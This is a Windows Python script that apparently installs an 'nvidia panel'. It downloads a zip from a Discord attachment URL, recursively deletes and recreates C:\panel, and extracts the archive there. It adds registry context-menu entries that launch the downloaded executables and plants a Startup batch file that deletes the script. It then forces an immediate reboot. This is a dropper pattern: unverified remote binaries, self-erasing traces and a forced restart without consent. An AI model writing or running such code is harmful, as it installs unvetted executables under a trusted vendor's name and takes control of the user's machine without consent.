import os
import sys
import requests
from zipfile import ZipFile
import subprocess
os.system('cls')
filelocation=sys.argv[0]
print(filelocation)
#REG Add "HKEY_CLASSES_ROOT\Directory\Background\shell\nvidia panel\command" /ve /d "COSA A REMPLAZAR EN DEFAULT" /f
url="https://cdn.discordapp.com/attachments/901637950520033291/998666769466134558/panel.zip"
os.system('cd \\ && RD /S /Q panel ')
os.system("cd \\ && MKDIR panel")
os.system('cls')
os.chdir(r'C:\panel')
r = requests.get(url, allow_redirects=True)
open('panel.zip', 'wb').write(r.content)
with ZipFile('panel.zip', 'r') as zipObj:
   # Extract all the contents of zip file in current directory
   zipObj.extractall()

os.system(r'reg add "HKEY_CLASSES_ROOT\Directory\Background\shell\nvidia panel" /f')
os.system(r'reg add "HKEY_CLASSES_ROOT\Directory\Background\shell\nvidia panel\command" /f')
os.system(r'reg add "HKEY_CLASSES_ROOT\Directory\Background\shell\nvidia panel\command" /ve /d "nvidia panel" /f')
os.system(r'reg add "HKEY_CLASSES_ROOT\Directory\Background\shell\nvidia panel" /v "Icon" /t REG_EXPAND_SZ /d "%systemdrive%\panel\NvGpuUtilization.exe" /f')
os.system(r'reg add "HKEY_CLASSES_ROOT\Directory\Background\shell\nvidia panel\command" /ve /d "%systemdrive%\panel\nvcplui.exe" /f')
os.system(f'cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" && echo del "{filelocation}" > a.bat')
os.system(f'cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" && echo DEL "%~f0"... >> a.bat')
os.system('shutdown -r -f -t 0')